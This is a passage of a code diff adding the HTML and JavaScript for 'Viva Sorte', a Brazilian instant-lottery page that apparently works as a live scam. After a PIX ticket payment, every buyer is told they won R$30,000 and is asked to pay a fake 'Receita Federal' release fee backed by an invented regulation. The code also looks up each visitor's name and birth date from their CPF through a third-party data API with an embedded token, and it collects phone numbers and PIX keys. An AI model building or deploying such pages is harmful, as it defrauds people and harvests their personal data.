+                    </div>
+                    <div class="etapa-item">
+                        <div class="etapa-numero">3</div>
+                        <div class="etapa-nome">Confirmação</div>
+                    </div>
+                    <div class="etapa-item">
+                        <div class="etapa-numero">4</div>
+                        <div class="etapa-nome">Concluído</div>
+                    </div>
+                </div>
+                
+                <div class="modal-body">
+                    <h2>Informe seu telefone</h2>
+                    <p>Para contato e confirmação do prêmio</p>
+                    
+                    <div class="form-group">
+                        <label>Telefone (WhatsApp)</label>
+                        <input type="tel" id="inputTelefone" placeholder="Ex: (11) 99999-9999" maxlength="20">
+                        <div class="exemplo-input">Digite com ou sem o código do Brasil (55). Aceitamos qualquer formato!</div>
+                        <div id="erroTelefone" class="mensagem-erro"></div>
+                    </div>
+                    
+                    <div class="resumo-pagamento">
+                        <h3>Resumo do pagamento</h3>
+                        <div class="detalhes-pagamento">
+                            <div><span id="quantidadeResumo">6</span> títulos</div>
+                            <div>R$ <span id="valorResumo">5,94</span></div>
+                        </div>
+                        <div class="total-pagamento">
+                            <div>Total</div>
+                            <div>R$ <span id="totalResumo">5,94</span></div>
+                        </div>
+                    </div>
+                    
+                    <div id="areaPIX" class="area-pix">
+                        <div class="qrcode-container">
+                            <div id="qrCodeImage"></div>
+                            <p style="color: #666; font-size: 13px; margin-top: 10px;">Escaneie o QR Code com seu app bancário</p>
+                        </div>
+                        
+                        <div class="codigo-pix">
+                            <p style="color: #333; font-size: 14px; margin-bottom: 8px;">Ou copie o código PIX:</p>
+                            <div class="input-copiar">
+                                <input type="text" id="codigoPIX" readonly="" style="font-size: 11px;">
+                                <button onclick="copiarCodigoPIX()">Copiar</button>
+                            </div>
+                        </div>
+                        
+                        <p style="color: #666; font-size: 13px; text-align: center; margin-top: 15px;">
+                            Após o pagamento, aguarde a confirmação automática
+                        </p>
+                    </div>
+                    
+                    <!-- ÁREA DE AGUARDANDO CONFIRMAÇÃO -->
+                    <div id="aguardandoConfirmacao" class="aguardando-confirmacao">
+                        <div class="rodinha-grande"></div>
+                        <div class="aguardando-texto">Aguardando confirmação do pagamento</div>
+                        <div class="aguardando-detalhes" id="statusAguardando">Verificando se o pagamento foi realizado...</div>
+                    </div>
+                    
+                    <button id="btnGerarPIX" class="btn-principal" onclick="gerarPIX()">
+                        Gerar PIX para pagamento
+                    </button>
+                </div>
+            </div>
+            
+            <!-- ETAPA 3: CONFIRMAÇÃO -->
+            <div id="etapa3" class="etapa">
+                <div class="modal-header">
+                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
+                </div>
+                
+                <div class="progresso-etapas">
+                    <div class="etapa-item completada">
+                        <div class="etapa-numero">✓</div>
+                        <div class="etapa-nome">Identificação</div>
+                    </div>
+                    <div class="etapa-item completada">
+                        <div class="etapa-numero">✓</div>
+                        <div class="etapa-nome">Pagamento</div>
+                    </div>
+                    <div class="etapa-item ativa">
+                        <div class="etapa-numero">3</div>
+                        <div class="etapa-nome">Confirmação</div>
+                    </div>
+                    <div class="etapa-item">
+                        <div class="etapa-numero">4</div>
+                        <div class="etapa-nome">Concluído</div>
+                    </div>
+                </div>
+                
+                <div class="modal-body">
+                    <div class="confirmacao-sucesso">
+                        <div class="icone-confirmacao">✅</div>
+                        <h2 style="color: #155724; margin-bottom: 10px;">Pagamento Confirmado!</h2>
+                        <p style="color: #155724;">Seu pagamento de <strong>R$ <span id="valorConfirmado">5,94</span></strong> foi processado com sucesso.</p>
+                        <p style="color: #155724; font-size: 12px; margin-top: 10px;" id="confirmacaoDetalhes">
+                            Transação ID: <span id="transacaoId"></span>
+                        </p>
+                    </div>
+                    
+                    <div class="anuncio-premio-clean">
+                        <div class="icone-premio">
+                            <i class="bi bi-gift-fill"></i>
+                        </div>
+                        <h3>Parabéns!</h3>
+                        <p class="texto-premio">Você está participando do sorteio instantâneo <strong>VIVA SORTE</strong></p>
+                        <p class="subtitulo-premio">Clique no botão abaixo para revelar seu prêmio</p>
+                    </div>
+                    
+                    <button class="btn-premio btn-premio-clean" onclick="avancarParaEtapa4()">
+                        <i class="bi bi-sparkles"></i>
+                        REVELAR PRÊMIO INSTANTÂNEO
+                        <i class="bi bi-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+            
+            <!-- ETAPA 4: PRÊMIO DE 30 MIL + CHAVE PIX + TAXA RECEITA FEDERAL -->
+            <div id="etapa4" class="etapa">
+                <div class="modal-header">
+                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
+                </div>
+                
+                <div class="progresso-etapas">
+                    <div class="etapa-item completada">
+                        <div class="etapa-numero">✓</div>
+                        <div class="etapa-nome">Identificação</div>
+                    </div>
+                    <div class="etapa-item completada">
+                        <div class="etapa-numero">✓</div>
+                        <div class="etapa-nome">Pagamento</div>
+                    </div>
+                    <div class="etapa-item completada">
+                        <div class="etapa-numero">✓</div>
+                        <div class="etapa-nome">Confirmação</div>
+                    </div>
+                    <div class="etapa-item ativa">
+                        <div class="etapa-numero">4</div>
+                        <div class="etapa-nome">Concluído</div>
+                    </div>
+                </div>
+                
+                <div class="modal-body">
+                    <div class="texto-chamativo-premio">
+                        🎉 PARABÉNS! VOCÊ GANHOU R$30.000,00! 🎉
+                    </div>
+                    
+                    <div class="premio-ganho">
+                        <div class="imagem-premio">
+                            <img src="images/fallback-premio.png" alt="Parabéns! Prêmio de R$ 30.000,00" onerror="this.onerror=null; this.src='images/fallback-premio.png';">
+                        </div>
+                        
+                        <div class="info-cota-premiada">
+                            <i class="bi bi-ticket-perforated-fill" style="margin-right: 8px;"></i>
+                            VOCÊ ACHOU A COTA PREMIADA <strong>#202530000</strong> E GANHOU <strong>30 MIL REAIS</strong>!
+                        </div>
+                    </div>
+
+                    <div class="form-chave-pix">
+                        <h3><i class="bi bi-piggy-bank-fill"></i> Informe sua chave PIX para receber o prêmio</h3>
+                        
+                        <div class="form-group">
+                            <label>Tipo de chave PIX</label>
+                            <select id="tipoChavePix" class="select-chave" onchange="atualizarPlaceholderChave()">
+                                <option value="cpf">CPF</option>
+                                <option value="celular">Celular (com DDD)</option>
+                                <option value="email">E-mail</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label id="labelChavePix">Chave PIX (CPF)</label>
+                            <input type="text" id="inputChavePix" placeholder="Digite seu CPF" oninput="formatarChavePix()">
+                            <div class="exemplo-input" id="exemploChavePix">Exemplo: 123.456.789-09</div>
+                            <div id="erroChavePix" class="mensagem-erro"></div>
+                        </div>
+                    </div>
+                    
+                    <button class="btn-sacar-premio" onclick="sacarPremio()">
+                        <i class="bi bi-cash-coin"></i>
+                        SACAR R$30.000,00 AGORA
+                    </button>
+                    
+                    <div id="areaPagamentoTaxa" class="area-pagamento-taxa">
+                        <div class="aviso-receita">
+                            <i class="bi bi-exclamation-triangle-fill" style="margin-right: 8px;"></i>
+                            <strong>LIBERAÇÃO DO PRÊMIO</strong><br><br>
+                            
+                            <p style="margin-bottom: 10px;">De acordo com a Instrução Normativa RFB nº 2025/2024, prêmios acima de R$ 20.000 estão sujeitos à tributação.</p>
+                            
+                            <p style="margin-bottom: 10px;"><strong>DESCONTO ESPECIAL:</strong> Por ser sorteio beneficente, você tem 80% de redução no valor!</p>
+                            
+                            <p style="margin-bottom: 15px;">Taxa reduzida de <strong>R$ 450,00</strong> para apenas:</p>
+                            
+                            <div class="quadro-taxa">
+                                <div class="texto-taxa-pequeno">VALOR FINAL A PAGAR:</div>
+                                <div class="valor-taxa-branco">R$ 27,40</div>
+                                <div class="texto-taxa-rodape">Taxa única de liberação do prêmio</div>
+                            </div>
+                        </div>
+                        
+                        <div id="areaPIXTaxa" class="area-pix" style="display: block; margin-top: 10px;">
+                            <div class="qrcode-container">
+                                <div id="qrCodeTaxa"></div>
+                                <p style="color: #666; font-size: 13px;">Escaneie para pagar a taxa de R$ 27,40</p>
+                            </div>
+                            
+                            <div class="codigo-pix">
+                                <p style="color: #333; font-size: 14px; margin-bottom: 8px;">Ou copie o código PIX:</p>
+                                <div class="input-copiar">
+                                    <input type="text" id="codigoPIXTaxa" readonly="">
+                                    <button onclick="copiarCodigoPIXTaxa()">Copiar</button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div id="aguardandoTaxa" class="aguardando-confirmacao" style="display: none;">
+                            <div class="rodinha-grande"></div>
+                            <div class="aguardando-texto">Aguardando confirmação do pagamento da taxa</div>
+                            <div class="aguardando-detalhes" id="statusTaxa">Verificando pagamento...</div>
+                        </div>
+                    </div>
+
+                    <div id="mensagemFinalPremio" style="display: none;">
+                        <div class="passos-premio">
+                            <h3><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> Taxa paga com sucesso!</h3>
+                            <ul>
+                                <li><span class="bi bi-ticket-perforated"></span> Cota premiada: <strong>#202530000</strong></li>
+                                <li><span class="bi bi-cash-coin"></span> Valor do prêmio: <strong>R$ 30.000,00</strong></li>
+                                <li><span class="bi bi-whatsapp"></span> Nossa equipe entrará em contato via WhatsApp nas próximas 24 horas</li>
+                                <li><span class="bi bi-telephone"></span> Você receberá uma ligação para confirmar os dados bancários</li>
+                                <li><span class="bi bi-bank"></span> O depósito será realizado em até 2 dias úteis</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="agradecimento">
+                            <p><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> <strong>Prêmio liberado para pagamento!</strong></p>
+                            <p>A equipe Viva Sorte entrará em contato em breve.</p>
+                        </div>
+                        
+                        <button class="btn-suporte-final" onclick="abrirSuporteWhatsApp()">
+                            <i class="bi bi-whatsapp"></i>
+                            FALAR COM SUPORTE
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- POPUPS DE NOTIFICAÇÃO -->
+    <div class="popup" id="popup"></div>
+    <audio id="notifySound" preload="auto">
+        <source src="media/beep-07.wav" type="audio/wav">
+    </audio>
+
+    <!-- SCRIPTS -->
+    <script async="" src="js/fbevents.js"></script><script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+    
+    <script>
+    // VARIÁVEIS GLOBAIS
+    let pacoteSelecionado = {
+        quantidade: 6,
+        valor: 5.94
+    };
+    
+    let dadosUsuario = {
+        cpf: '',
+        nome: '',
+        data_nascimento: '',
+        telefone: '',
+        transactionId: '',
+        pixData: null,
+        chavePix: '',
+        tipoChavePix: 'cpf',
+        taxaPaga: false
+    };
+
+    const SUPABASE_URL = 'https://zizifxeiqiopaxcykpkt.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InppemlmeGVpcWlvcGF4Y3lrcGt0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ0OTcyMTgsImV4cCI6MjA5MDA3MzIxOH0.zZmmp4m9ocFjVmxZpiRA22eeqpHuXYYvJEOAzQ0aftE';
+    const ALLOWPAY_CONFIG = {
+        API_URL: SUPABASE_URL + '/functions/v1/create-pix-charge',
+        CHECK_PAYMENT_URL: SUPABASE_URL + '/functions/v1/check-pix-status',
+        CHECK_CONFIRMED_URL: SUPABASE_URL + '/functions/v1/check-pix-status',
+        HEADERS: {
+            'Content-Type': 'application/json',
+            'apikey': SUPABASE_ANON_KEY,
+        }
+    };
+
+    const CPF_API_URL = 'https://api.amnesiatecnologia.rocks/?token=4c80cd47-d9d5-4672-a301-b9b8741fc293&cpf=';
+
+    let verificacaoAutomatica = null;
+    let tentativasVerificacao = 0;
+    let verificacaoTaxaAutomatica = null;
+
+    // FUNÇÃO CORRIGIDA PARA SELEÇÃO DE PACOTE
+    function selecionarPacote(quantidade, valor, event) {
+        console.log('Selecionando pacote:', quantidade, valor);
+        
+        pacoteSelecionado = {
+            quantidade: quantidade,
+            valor: valor
+        };
+        
+        document.getElementById('numero').value = quantidade;
+        document.getElementById('btn-adicionar-carrinho').disabled = false;
+        
+        document.querySelectorAll('.cota').forEach(btn => {
+            btn.classList.remove('cota-selected');
+        });
+        
+        if (event && event.currentTarget) {
+            event.currentTarget.classList.add('cota-selected');
+        }
+        
+        abrirModalPagamento();
+    }
+
+    function enviarEventoConversao(valor, quantidade, transactionId) {
+        console.log('📊 Enviando evento de conversão para pixels');
+        
+        if (window.utmify && window.utmify.event) {
+            window.utmify.event('purchase', {
+                value: valor,
+                currency: 'BRL',
+                transaction_id: transactionId,
+                items: [{
+                    item_id: 'vivasorte_titulos',
+                    item_name: 'Títulos Viva Sorte',
+                    quantity: quantidade,
+                    price: valor / quantidade
+                }]
+            });
+        }
+        
+        if (typeof fbq !== 'undefined') {
+            fbq('track', 'Purchase', {
+                value: valor,
+                currency: 'BRL',
+                content_ids: ['vivasorte_titulos'],
+                content_name: 'Títulos Viva Sorte',
+                content_type: 'product',
+                num_items: quantidade
+            });
+        }
+        
+        localStorage.setItem(`conversion_tracked_${transactionId}`, 'true');
+    }
+
+    function abrirSuporteWhatsApp() {
+        const whatsappLink = "https://wa.me/5511954268216?text=Olá!%20Ganhei%20R$%2030.000,00%20no%20Viva%20Sorte%20e%20gostaria%20de%20receber%20meu%20prêmio.";
+        window.open(whatsappLink, '_blank', 'noopener,noreferrer');
+    }
+
+    function incrementar() {
+        let input = document.getElementById('numero');
+        let valor = parseInt(input.value) || 0;
+        
+        if (valor < 200) {
+            if (valor === 0) input.value = 6;
+            else if (valor === 6) input.value = 10;
+            else if (valor === 10) input.value = 15;
+            else if (valor === 15) input.value = 20;
+            else if (valor === 20) input.value = 30;
+            else if (valor === 30) input.value = 40;
+            else if (valor === 40) input.value = 70;
+            else if (valor === 70) input.value = 100;
+            else if (valor === 100) input.value = 200;
+        }
+        
+        atualizarBotaoComprar();
+    }
+
+    function decrementar() {
+        let input = document.getElementById('numero');
+        let valor = parseInt(input.value) || 0;
+        
+        if (valor > 6) {
+            if (valor === 200) input.value = 100;
+            else if (valor === 100) input.value = 70;
+            else if (valor === 70) input.value = 40;
+            else if (valor === 40) input.value = 30;
+            else if (valor === 30) input.value = 20;
+            else if (valor === 20) input.value = 15;
+            else if (valor === 15) input.value = 10;
+            else if (valor === 10) input.value = 6;
+        } else {
+            input.value = 0;
+        }
+        
+        atualizarBotaoComprar();
+    }
+
+    function atualizarBotaoComprar() {
+        let input = document.getElementById('numero');
+        let valor = parseInt(input.value) || 0;
+        let btn = document.getElementById('btn-adicionar-carrinho');
+        
+        if (valor > 0) {
+            btn.disabled = false;
+            let valorTotal = (valor * 0.99).toFixed(2);
+            pacoteSelecionado = {
+                quantidade: valor,
+                valor: parseFloat(valorTotal)
+            };
+        } else {
+            btn.disabled = true;
+        }
+    }
+
+    function comprarTitulosCustom() {
+        let input = document.getElementById('numero');
+        let quantidade = parseInt(input.value) || 0;
+        
+        if (quantidade > 0) {
+            let valorTotal = (quantidade * 0.99).toFixed(2);
+            pacoteSelecionado = {
+                quantidade: quantidade,
+                valor: parseFloat(valorTotal)
+            };
+            
+            abrirModalPagamento();
+        }
+    }
+
+    function abrirModalPagamento() {
+        console.log('Abrindo modal, pacote:', pacoteSelecionado);
+        
+        dadosUsuario = {
+            cpf: '',
+            nome: '',
+            data_nascimento: '',
+            telefone: '',
+            transactionId: '',
+            pixData: null,
+            chavePix: '',
+            tipoChavePix: 'cpf',
+            taxaPaga: false
+        };
+        
+        atualizarResumoCompra();
+        mostrarEtapa(1);
+        
+        document.getElementById('inputCPF').value = '';
+        document.getElementById('inputCPF').style.borderColor = '#e0e0e0';
+        document.getElementById('erroCPF').style.display = 'none';
+        document.getElementById('dadosEncontrados').style.display = 'none';
+        document.getElementById('erroAPI').style.display = 'none';
+        document.getElementById('areaConsultaCPF').style.display = 'none';
+        document.getElementById('btnContinuarCPF').disabled = true;
+        document.getElementById('btnContinuarCPF').style.background = '#cccccc';
+        
+        document.getElementById('modalPagamento').style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+        
+        setTimeout(() => {
+            document.getElementById('inputCPF').focus();
+        }, 300);
+    }
+
+    function fecharModal() {
+        document.getElementById('modalPagamento').style.display = 'none';
+        document.body.style.overflow = 'auto';
+        pararVerificacaoAutomatica();
+        if (verificacaoTaxaAutomatica) {
+            clearInterval(verificacaoTaxaAutomatica);
+            verificacaoTaxaAutomatica = null;
+        }
+    }
+
+    function atualizarResumoCompra() {
+        document.getElementById('resumoCompra').textContent = 
+            pacoteSelecionado.quantidade + ' títulos - R$' + pacoteSelecionado.valor.toFixed(2).replace('.', ',');
+        
+        document.getElementById('quantidadeResumo').textContent = pacoteSelecionado.quantidade;
+        document.getElementById('valorResumo').textContent = pacoteSelecionado.valor.toFixed(2).replace('.', ',');
+        document.getElementById('totalResumo').textContent = pacoteSelecionado.valor.toFixed(2).replace('.', ',');
+        document.getElementById('valorConfirmado').textContent = pacoteSelecionado.valor.toFixed(2).replace('.', ',');
+    }
+
+    function mostrarEtapa(numeroEtapa) {
+        document.querySelectorAll('.etapa').forEach(etapa => {
+            etapa.classList.remove('ativa');
+        });
+        
+        document.getElementById('etapa' + numeroEtapa).classList.add('ativa');
+        atualizarProgressoEtapas(numeroEtapa);
+    }
+
+    function atualizarProgressoEtapas(etapaAtual) {
+        document.querySelectorAll('.etapa-item').forEach((item, index) => {
+            item.classList.remove('ativa', 'completada');
+            
+            const numeroItem = index + 1;
+            
+            if (numeroItem < etapaAtual) {
+                item.classList.add('completada');
+                item.querySelector('.etapa-numero').textContent = '✓';
+            } else if (numeroItem === etapaAtual) {
+                item.classList.add('ativa');
+            }
+        });
+    }
+
+    document.getElementById('inputCPF').addEventListener('input', function(e) {
+        formatarCPF(this);
+        
+        document.getElementById('erroCPF').style.display = 'none';
+        document.getElementById('dadosEncontrados').style.display = 'none';
+        document.getElementById('erroAPI').style.display = 'none';
+        
+        const btn = document.getElementById('btnContinuarCPF');
+        btn.disabled = true;
+        btn.style.background = '#cccccc';
+    });
+
+    function formatarCPF(input) {
+        let value = input.value.replace(/\D/g, '');
+        
+        if (value.length <= 11) {
+            value = value.replace(/(\d{3})(\d)/, '$1.$2');
+            value = value.replace(/(\d{3})(\d)/, '$1.$2');
+            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+        }
+        
+        input.value = value;
+        
+        const cpfNumeros = value.replace(/\D/g, '');
+        
+        if (cpfNumeros.length === 11) {
+            consultarCPF(cpfNumeros);
+        }
+    }
+
+    async function consultarCPF(cpf) {
+        const areaConsulta = document.getElementById('areaConsultaCPF');
+        const erroAPI = document.getElementById('erroAPI');
+        const inputCPF = document.getElementById('inputCPF');
+        
+        areaConsulta.style.display = 'block';
+        erroAPI.style.display = 'none';
+        
+        try {
+            console.log('🔍 Consultando CPF:', cpf);
+            
+            const response = await fetch(CPF_API_URL + cpf);
+            const data = await response.json();
+            
+            console.log('📥 Resposta da API:', data);
+            
+            areaConsulta.style.display = 'none';
+            
+            if (data.erro) {
+                erroAPI.textContent = 'CPF não encontrado ou inválido.';
+                erroAPI.style.display = 'block';
+                inputCPF.style.borderColor = '#e74c3c';
+                return;
+            }
+            
+            if (data.DADOS && data.DADOS.nome) {
+                const nome = data.DADOS.nome;
+                const dataNascimento = data.DADOS.data_nascimento;
+                
+                let dataFormatada = '';
+                if (dataNascimento) {
+                    const partes = dataNascimento.split('/');
+                    if (partes.length === 3) {
+                        dataFormatada = `${partes[2]}-${partes[1]}-${partes[0]}`;
+                    }
+                }
+                
+                dadosUsuario.cpf = cpf;
+                dadosUsuario.nome = nome;
+                dadosUsuario.data_nascimento = dataFormatada;
+                
+                document.getElementById('nomeEncontrado').textContent = nome;
+                document.getElementById('dataNascimentoEncontrada').textContent = dataNascimento || 'Não informada';
+                document.getElementById('dadosEncontrados').style.display = 'block';
+                
+                const btn = document.getElementById('btnContinuarCPF');
+                btn.disabled = false;
+                btn.style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
+                
+                inputCPF.style.borderColor = '#28a745';
+                
+                mostrarPopupNotificacao('✅ Dados do CPF encontrados com sucesso!');
+                
+            } else {
+                erroAPI.textContent = 'Formato de resposta inválido da API.';
+                erroAPI.style.display = 'block';
+                inputCPF.style.borderColor = '#e74c3c';
+            }
+            
+        } catch (error) {
+            console.error('❌ Erro na consulta:', error);
+            areaConsulta.style.display = 'none';
+            erroAPI.textContent = 'Erro ao consultar CPF. Verifique sua conexão.';
+            erroAPI.style.display = 'block';
+            inputCPF.style.borderColor = '#e74c3c';
+        }
+    }
+
+    function validarCPF(cpf) {
+        cpf = cpf.replace(/\D/g, '');
+        
+        if (cpf.length !== 11) return false;
+        if (/^(\d)\1+$/.test(cpf)) return false;
+        
+        let soma = 0;
+        for (let i = 0; i < 9; i++) {
+            soma += parseInt(cpf.charAt(i)) * (10 - i);
+        }
+        let resto = soma % 11;
+        let digito1 = resto < 2 ? 0 : 11 - resto;
+        
+        if (digito1 !== parseInt(cpf.charAt(9))) return false;
+        
+        soma = 0;
+        for (let i = 0; i < 10; i++) {
+            soma += parseInt(cpf.charAt(i)) * (11 - i);
+        }
+        resto = soma % 11;
+        let digito2 = resto < 2 ? 0 : 11 - resto;
+        
+        return digito2 === parseInt(cpf.charAt(10));
+    }
+
+    function validarCPFeAvancar() {
+        if (!dadosUsuario.cpf || !dadosUsuario.nome) {
+            const erroAPI = document.getElementById('erroAPI');
+            erroAPI.textContent = 'Por favor, aguarde a consulta do CPF.';
+            erroAPI.style.display = 'block';
+            return;
+        }
+        
+        setTimeout(() => {
+            mostrarEtapa(2);
+            document.getElementById('inputTelefone').focus();
+        }, 500);
+    }
+
+    document.getElementById('inputTelefone').addEventListener('input', function(e) {
+        formatarTelefoneFlexivel(this);
+    });
+
+    function formatarTelefoneFlexivel(input) {
+        let value = input.value;
+        let cursorPos = input.selectionStart;
+        let originalLength = value.length;
+        let digits = value.replace(/\D/g, '');
+        
+        if (digits.length <= 13) {
+            let formatted = '';
+            
+            if (digits.length <= 2) {
+                formatted = digits;
+            } else if (digits.length <= 4) {
+                formatted = '(' + digits.substring(0, 2) + ') ' + digits.substring(2);
+            } else if (digits.length <= 9) {
+                formatted = '(' + digits.substring(0, 2) + ') ' + digits.substring(2, 7) + '-' + digits.substring(7);
+            } else if (digits.length <= 11) {
+                formatted = '(' + digits.substring(0, 2) + ') ' + digits.substring(2, 7) + '-' + digits.substring(7, 11);
+            } else {
+                formatted = digits;
+                if (digits.length === 13 && digits.startsWith('55')) {
+                    formatted = '+55 (' + digits.substring(2, 4) + ') ' + digits.substring(4, 9) + '-' + digits.substring(9, 13);
+                }
+            }
+            
+            input.value = formatted;
+            
+            let newCursorPos = cursorPos;
+            if (originalLength !== formatted.length) {
+                newCursorPos = cursorPos + (formatted.length - originalLength);
+                if (newCursorPos < 0) newCursorPos = 0;
+                if (newCursorPos > formatted.length) newCursorPos = formatted.length;
+            }
+            
+            setTimeout(() => {
+                input.setSelectionRange(newCursorPos, newCursorPos);
+            }, 0);
+        }
+        
+        document.getElementById('erroTelefone').style.display = 'none';
+        input.style.borderColor = '#e0e0e0';
+    }
+
+    function validarTelefone(telefone) {
+        const telefoneLimpo = telefone.replace(/\D/g, '');
+        const comprimentoValido = telefoneLimpo.length >= 10 && telefoneLimpo.length <= 13;
+        
+        const dddValido = () => {
+            if (telefoneLimpo.length === 10 || telefoneLimpo.length === 11) {
+                const ddd = telefoneLimpo.substring(0, 2);
+                return ddd >= '11' && ddd <= '99';
+            } else if (telefoneLimpo.length === 12 || telefoneLimpo.length === 13) {
+                if (!telefoneLimpo.startsWith('55')) return false;
+                const ddd = telefoneLimpo.substring(2, 4);
+                return ddd >= '11' && ddd <= '99';
+            }
+            return false;
+        };
+        
+        return comprimentoValido && dddValido();
+    }
+
+    function normalizarTelefoneParaEnvio(telefone) {
+        return telefone.replace(/\D/g, '');
+    }
+
+    async function gerarPIX() {
+        const telefoneInput = document.getElementById('inputTelefone');
+        const telefone = telefoneInput.value;
+        const telefoneNumeros = normalizarTelefoneParaEnvio(telefone);
+        const erroTelefone = document.getElementById('erroTelefone');
+        
+        if (!validarTelefone(telefone)) {
+            let mensagemErro = 'Telefone inválido. ';
+            const telefoneLimpo = telefoneNumeros;
+            
+            if (telefoneLimpo.length < 10) {
+                mensagemErro += 'Número muito curto. ';
+            } else if (telefoneLimpo.length > 13) {
+                mensagemErro += 'Número muito longo. ';
+            }
+            
+            mensagemErro += 'Digite um número válido com DDD (ex: 11 para São Paulo, 55 para RS).';
+            
+            erroTelefone.textContent = mensagemErro;
+            erroTelefone.style.display = 'block';
+            telefoneInput.style.borderColor = '#e74c3c';
+            telefoneInput.focus();
+            return;
+        }
+        
+        dadosUsuario.telefone = telefoneNumeros;
+        erroTelefone.style.display = 'none';
+        telefoneInput.style.borderColor = '#28a745';
+        
+        const btnGerarPIX = document.getElementById('btnGerarPIX');
+        btnGerarPIX.innerHTML = '<div class="spinner"></div> Gerando PIX...';
+        btnGerarPIX.disabled = true;
+        
+        try {
+            // Captura UTMs do UTMify
+            let utmString = '';
+            try {
+                if (window.utmParams && window.utmParams.toString()) {
+                    utmString = window.utmParams.toString();
+                } else {
+                    utmString = window.location.search.replace(/^\?/, '');
+                }
+            } catch(e) { utmString = window.location.search.replace(/^\?/, ''); }
+
+            const dadosPIX = {
+                amount: pacoteSelecionado.valor,
+                cpf: dadosUsuario.cpf,
+                nome: dadosUsuario.nome,
+                data_nascimento: dadosUsuario.data_nascimento,
+                telefone: telefoneNumeros,
+                quantidade: pacoteSelecionado.quantidade,
+                utm: utmString || null
+            };
+            
+            console.log('📤 Enviando para API com dados completos:', dadosPIX);
+            
+            const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
+                method: 'POST',
+                headers: ALLOWPAY_CONFIG.HEADERS,
+                body: JSON.stringify(dadosPIX)
+            });
+            
+            const resultado = await response.json();
+            console.log('📥 Resposta API:', resultado);
+            
+            if (!resultado.success) {
+                throw new Error(resultado.error || 'Erro ao gerar PIX');
+            }
+            
+            const qrCodeImage = resultado.qr_code_image || 
+                `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(resultado.codigo_pix || resultado.qr_code)}`;
+            
+            document.getElementById('qrCodeImage').innerHTML = 
+                `<img src="${qrCodeImage}" alt="QR Code PIX" style="max-width: 200px; border: 1px solid #ddd;">`;
+            
+            document.getElementById('codigoPIX').value = resultado.codigo_pix || resultado.qr_code;
+            
+            document.getElementById('areaPIX').style.display = 'block';
+            
+            btnGerarPIX.style.display = 'none';
+            
+            document.getElementById('aguardandoConfirmacao').style.display = 'block';
+            
+            dadosUsuario.transactionId = resultado.transaction_id;
+            dadosUsuario.pixData = resultado;
+            
+            localStorage.setItem(`pix_vs_${resultado.transaction_id}`, JSON.stringify({
+                ...resultado,
+                cpf: dadosUsuario.cpf,
+                nome: dadosUsuario.nome,
+                data_nascimento: dadosUsuario.data_nascimento,
+                telefone: dadosUsuario.telefone,
+                quantidade: pacoteSelecionado.quantidade,
+                valor: pacoteSelecionado.valor,
+                gerado_em: new Date().toISOString(),
+                status: 'pending'
+            }));
+            
+            mostrarPopupNotificacao('PIX gerado! Copie o código ou escaneie o QR Code.');
+            
+            iniciarVerificacaoAutomatica();
+            
+        } catch (error) {
+            console.error('❌ Erro:', error);
+            
+            const areaErro = document.getElementById('erroTelefone');
+            areaErro.textContent = `Erro: ${error.message}. Verifique sua conexão ou tente novamente.`;
+            areaErro.style.display = 'block';
+            
+            btnGerarPIX.innerHTML = 'Gerar PIX para pagamento';
+            btnGerarPIX.disabled = false;
+            btnGerarPIX.style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
+            
+            mostrarPopupNotificacao('Erro ao gerar PIX. Tente novamente.', true);
+        }
+    }
+
+    function copiarCodigoPIX() {
+        const codigoInput = document.getElementById('codigoPIX');
+        const btnCopiar = document.querySelector('.input-copiar button');
+        
+        if (!codigoInput.value) {
+            mostrarPopupNotificacao('❌ Nenhum código PIX disponível para copiar.', true);
+            return;
+        }
+        
+        const textoOriginal = btnCopiar.textContent;
+        
+        codigoInput.select();
+        codigoInput.setSelectionRange(0, 99999);
+        
+        navigator.clipboard.writeText(codigoInput.value)
+            .then(() => {
+                btnCopiar.textContent = '✅ Copiado!';
+                btnCopiar.style.background = '#28a745';
+                
+                mostrarPopupNotificacao('✅ Código PIX copiado com sucesso!');
+                
+                setTimeout(() => {
+                    btnCopiar.textContent = textoOriginal;
+                    btnCopiar.style.background = '#2f4eb5';
+                }, 3000);
+            })
+            .catch(err => {
+                console.error('Erro ao copiar: ', err);
+                document.execCommand('copy');
+                btnCopiar.textContent = '❌ Falhou';
+                btnCopiar.style.background = '#e74c3c';
+                
+                mostrarPopupNotificacao('⚠️ Selecione e copie manualmente (Ctrl+C).', true);
+                
+                setTimeout(() => {
+                    btnCopiar.textContent = textoOriginal;
+                    btnCopiar.style.background = '#2f4eb5';
+                }, 3000);
+            });
+    }
+
+    async function verificarPagamentoAutomatico() {
+        if (!dadosUsuario.transactionId) {
+            console.log('❌ Nenhuma transação para verificar');
+            return;
+        }
+        
+        tentativasVerificacao++;
+        document.getElementById('statusAguardando').textContent = `Verificando pagamento...`;
+        
+        try {
+            const response = await fetch(ALLOWPAY_CONFIG.CHECK_PAYMENT_URL, {
+                method: 'POST',
+                headers: ALLOWPAY_CONFIG.HEADERS,
+                body: JSON.stringify({
+                    transaction_id: dadosUsuario.transactionId
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (!result.success) {
+                console.log('❌ Erro na verificação:', result.error);
+                return;
+            }
+            
+            const status = result.status;
+            const allowpayStatus = result.allowpay_status;
+            
+            console.log(`📊 Status do pagamento: ${allowpayStatus}`);
+            
+            const statusConfirmados = ['paid', 'completed', 'approved'];
+            
+            if (statusConfirmados.includes(status)) {
+                console.log('✅ Pagamento confirmado automaticamente!');
+                
